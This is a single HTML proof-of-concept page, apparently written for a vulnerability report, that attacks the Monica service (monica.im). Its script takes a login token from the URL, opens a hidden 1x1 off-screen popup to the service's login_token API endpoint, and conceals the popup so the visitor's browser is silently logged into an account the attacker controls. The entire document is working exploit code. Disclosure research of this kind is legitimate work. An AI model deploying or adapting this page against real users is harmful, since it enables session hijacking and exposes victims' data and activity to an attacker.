<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PoC</title>
  <style>
    body {
      margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
      background: #0a0a0a; color: #888; font-family: system-ui, sans-serif; font-size: 13px;
      padding: 1rem; text-align: center; max-width: 26rem;
    }
    button {
      cursor: pointer; padding: 6px 14px; margin-top: 0.75rem;
      border-radius: 6px; border: 1px solid #333; background: #1a1a1a; color: #bbb; font-size: 12px;
    }
    code { color: #5a9; word-break: break-all; font-size: 11px; }
    a { color: #69f; }
    #extra { margin-top: 0.75rem; font-size: 11px; line-height: 1.45; color: #666; }
  </style>
</head>
<body>
  <div>
    <p id="hint">…</p>
    <button id="go" type="button" hidden>Continue</button>
    <p id="extra"></p>
  </div>
  <script>
    (function () {
      var p = new URLSearchParams(location.search);
      var t = p.get('t') || p.get('token') || p.get('iframe_token');
      var hint = document.getElementById('hint');
      var extra = document.getElementById('extra');
      var btn = document.getElementById('go');

      if (t === null || t === '') {
        hint.innerHTML = '<code>?t=…</code>';
        extra.textContent =
          'Solo GET a login_token. No abrir Monica desde JS (eso sumaba efectos extra con la sesión).';
        return;
      }

      var api = 'https://api.monica.im/api/user/login_token?token=' + encodeURIComponent(t);

      function offXY() {
        return {
          x: screen.availLeft + screen.availWidth + 400,
          y: screen.availTop + screen.availHeight + 400
        };
      }

      function tuck(w) {
        if (!w) return;
        try {
          w.resizeTo(1, 1);
          var o = offXY();
          w.moveTo(o.x, o.y);
        } catch (e) {}
        try {
          w.blur();
          window.focus();
        } catch (e2) {}
      }

      /*
       * Un solo paso automático: abrir esa URL en un popup chico fuera de pantalla.
       * Ni segundo window.open(monica.im), ni location.replace(monica.im), ni temporizadores extras.
       * Entrá vos a monica.im cuando quieras.
       */

      extra.innerHTML =
        'Cuando el popup cargó, abrís <a href="https://monica.im/" rel="noopener">monica.im</a> en una pestaña nueva.';

      function doit() {
        var o = offXY();
        var feats =
          'width=1,height=1,left=' +
          o.x +
          ',top=' +
          o.y +
          ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';
        var pop = window.open(api, '_blank', feats);
        if (pop) {
          tuck(pop);
          hint.textContent = 'Listo.';
          return true;
        }
        hint.textContent = 'Popup bloqueado.';
        hint.style.color = '#a66';
        return false;
      }

      if (!doit()) {
        btn.hidden = false;
        btn.addEventListener('click', function () {
          if (doit()) btn.hidden = true;
        });
      }
    })();
  </script>
</body>
</html>
